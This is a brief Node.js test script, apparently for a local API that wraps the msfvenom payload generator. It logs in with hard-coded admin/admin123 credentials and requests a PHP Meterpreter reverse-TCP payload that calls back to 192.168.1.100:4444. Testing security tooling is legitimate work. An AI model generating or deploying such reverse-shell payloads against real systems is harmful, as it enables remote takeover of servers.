const http = require('http');

function post(path, data, token) {
  return new Promise((resolve, reject) => {
    const payload = JSON.stringify(data || {});
    const headers = {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(payload)
    };
    if (token) headers['Authorization'] = 'Bearer ' + token;

    const req = http.request({
      hostname: 'localhost',
      port: 8080,
      path,
      method: 'POST',
      headers
    }, res => {
      let body = '';
      res.on('data', chunk => body += chunk);
      res.on('end', () => resolve(JSON.parse(body)));
    });
    req.on('error', reject);
    req.write(payload);
    req.end();
  });
}

async function testMsfvenomManager() {
  console.log("=== 1. AUTENTICANDO PARA TESTE DO MSFVENOM PAYLOAD GENERATOR ===");
  const auth = await post('/api/auth/login', { username: 'admin', password: 'admin123' });
  if (!auth.token) throw new Error("Falha ao obter token");

  console.log("\n=== 2. GERANDO PAYLOAD PHP METERPRETER REVERSE TCP ===");
  const genData = await post('/api/msfvenom/generate', {
    payload: 'php/meterpreter/reverse_tcp',
    lhost: '192.168.1.100',
    lport: 4444,
    format: 'php'
  }, auth.token);

  console.log("Resposta Completa da API:", genData);
}

testMsfvenomManager().catch(console.error);
